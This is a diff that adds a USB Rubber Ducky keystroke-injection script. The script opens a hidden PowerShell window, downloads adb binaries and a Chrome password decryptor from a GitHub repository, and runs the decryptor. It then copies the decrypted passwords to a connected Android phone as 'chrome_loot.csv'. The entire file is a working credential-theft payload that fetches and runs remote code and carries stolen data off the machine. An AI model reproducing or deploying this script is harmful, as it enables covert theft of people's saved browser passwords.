@@ -1,0 +1,23 @@
+GUI r
+DELAY 1000
+STRING powershell -windowstyle hidden
+ENTER
+DELAY 1000
+STRING Invoke-WebRequest https://github.com/bojtalepenye/usb-rubber-ducky/raw/main/adb/AdbWinApi.dll -o AdbWinAPI.dll
+ENTER
+STRING Invoke-WebRequest https://github.com/bojtalepenye/usb-rubber-ducky/raw/main/adb/AdbWinUsbApi.dll -o AdbWinUsbApi.dll
+ENTER
+STRING Invoke-WebRequest https://github.com/bojtalepenye/usb-rubber-ducky/raw/main/adb/adb.exe -o adb.exe
+ENTER
+STRING Invoke-WebRequest https://github.com/bojtalepenye/usb-rubber-ducky/raw/main/decrypt_chrome_password.exe -o decrypt.exe; .\decrypt.exe
+ENTER
+STRING Start-Process adb.exe devices -NoNewWindow
+ENTER
+DELAY 500
+STRING Start-Process adb.exe -Argumentlist "push decrypted_password.csv /storage/emulated/0/Documents/chrome_loot.csv" -NoNewWindow
+ENTER
+ENTER
+DELAY 1000
+STRING Start-Process adb.exe -Argumentlist "push decrypted_password.csv /storage/emulated/0/Documents/chrome_loot.csv" -NoNewWindow
+ENTER
+
